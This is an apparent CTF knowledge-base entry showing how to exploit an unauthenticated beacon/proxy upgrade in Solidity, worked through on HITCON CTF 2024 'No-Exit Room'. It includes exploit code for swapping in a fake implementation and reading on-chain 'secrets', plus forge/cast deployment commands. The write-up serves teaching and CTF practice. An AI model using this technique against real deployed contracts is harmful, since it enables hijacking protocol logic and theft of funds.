---
id: web3-unprotected-beacon-proxy-upgrade
category: WEB
tags: [web3, blockchain, evm, solidity, beacon, proxy, upgradeable, upgrade, implementation, access-control, fake-implementation, fake-oracle, fake-protocol, logic-swap, on-chain-secret, private-input-not-private, multi-contract, mpc-decoy, hitcon, no-exit-room, foundry, forge]
tools: [Web3]
manuals: ["Manuals/Web3/3. Contexto para Claude.md"]
title: "Web3: unauthenticated beacon/proxy upgrade → swap the implementation for a fake one that passes the checks"
difficulty: medium
created: 2026-10-08
updated: 2026-10-08
related: [web3-delegatecall-storage-collision-proxy, web3-constructor-typo-exposed-initializer, web3-commit-secret-msgsender-gated]
---

## How to recognize this pattern

- An **upgradeable** architecture: a `Beacon`/proxy holds the implementation address (`Protocol`,
  `logic`, `oracle`) and the business contracts query `beacon.implementation()` to run the logic. If
  the swap function (`beacon.update()`, `upgradeTo()`, `setImplementation()`) has **no access
  control**, anyone can point the beacon at their own contract → control all the logic routed through
  the proxy.
- A validation check delegates to that implementation (e.g. `require(protocol.eval(...) == ...)`) →
  with the fake implementation, you make the check return whatever you want.
- Common decoy: the challenge dresses itself up as **MPC/"private input"/math** (polynomials,
  secret-sharing). On-chain **nothing is private**: the "secrets" are in the storage/Setup. The math
  is a distraction.

## Method

Reference case: HITCON CTF 2024, No-Exit Room. `isSolved()` wants `puzzleSolved` +
`alice/bob/david.isSolved()` true and `isHacked()` false. Two chained bugs.

### 1. On-chain "secret" → read it and submit

Private inputs visible in the `Setup` (alice=2, bob=24, david=90). `commitPuzzle(y)` only wants
`keccak256(abi.encode(y)) == puzzleHash`:
```solidity
setup.commitPuzzle(int256(2 + 24 + 90));   // y = 116 -> matches puzzleHash
```

### 2. Unauthenticated beacon upgrade → FakeProtocol

`beacon.update()` is unprotected → point it at your own contract that makes `eval`/Lagrange return
`left == right` always:
```solidity
FakeProtocol fake = new FakeProtocol();
beacon.update(address(fake));   // every Room now uses YOUR logic
```

### 3. Satisfy each sub-contract (isSolved true, isHacked false)

`solveRoomPuzzle()` requires `historyRequestsLen >= 3` → make 3 requests per Room. Use `x` values that
are **not** the `privateInput` (otherwise `isHacked()` becomes true / reverts "had requested"):
```solidity
alice.request(address(bob),0); alice.request(address(david),0); alice.selfRequest(0);
bob.request(address(alice),1);   bob.request(address(david),1);   bob.selfRequest(1);
david.request(address(alice),3); david.request(address(bob),3);   david.selfRequest(3);
int256[] memory xvs = new int256[](3);
alice.solveRoomPuzzle(xvs); bob.solveRoomPuzzle(xvs); david.solveRoomPuzzle(xvs);
```

### 4. Run (Exploit contract, 1 tx) + grab the flag

All in one `Exploit.run()` (deploy + atomic calls). Foundry toolchain
(`Manuals/Web3/3. Contexto para Claude.md`):
```bash
FORGE=~/.config/.foundry/bin/forge
$FORGE create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK --broadcast --constructor-args $SETUP
$CAST send <Exploit> "run()" --rpc-url $RPC --private-key $PK
$CAST call $SETUP "isSolved()(bool)" --rpc-url $RPC
```
HITCON launcher: `nc host 31337`, menu `1 launch / 2 kill / 3 flag`; option `3` + uuid returns the flag
if `isSolved()`. The flag is `hitcon{...}`. Validate the flag against the CTF's configured flag format before declaring success.

## Gotchas

- **Look for the upgrade function first:** `update`/`upgradeTo`/`setImplementation`/`setBeacon` without
  `onlyOwner`/`require(msg.sender==...)` = game over. It's faster than solving the "puzzle".
- **The fake implementation must match the interface** the proxy calls (same signature of `eval` etc.)
  and return values that pass the `require`.
- **Don't leak the real secret** when the challenge has an anti-"hacked" flag: use dummy inputs at the
  points that would mark `isHacked()`.
- Multi-contract: check ALL of `isSolved()`'s conditions (each sub-contract + global flags) before
  declaring; batch everything into one tx to avoid partial state.

## Transferable lesson

An upgradeable proxy/beacon with an unprotected implementation setter = the attacker injects the logic.
It's the "legitimate" cousin of the storage-collision: there you overwrite the implementation slot by
collision; here you use the exposed upgrade function itself. Always: (1) nothing on-chain is secret,
(2) find the upgrade mechanism and check its auth, (3) swap the logic instead of solving the puzzle it
imposes.

## Related / Cross-reference

- `Arsenal/WEB/web3-delegatecall-storage-collision-proxy.md`: same goal (control the impl) via a
  storage collision instead of an exposed setter.
- `Arsenal/WEB/web3-constructor-typo-exposed-initializer.md`: another "setter/init with no auth".
- `Manuals/Web3/3. Contexto para Claude.md`: `forge`/`cast`, the Exploit contract, the launcher.
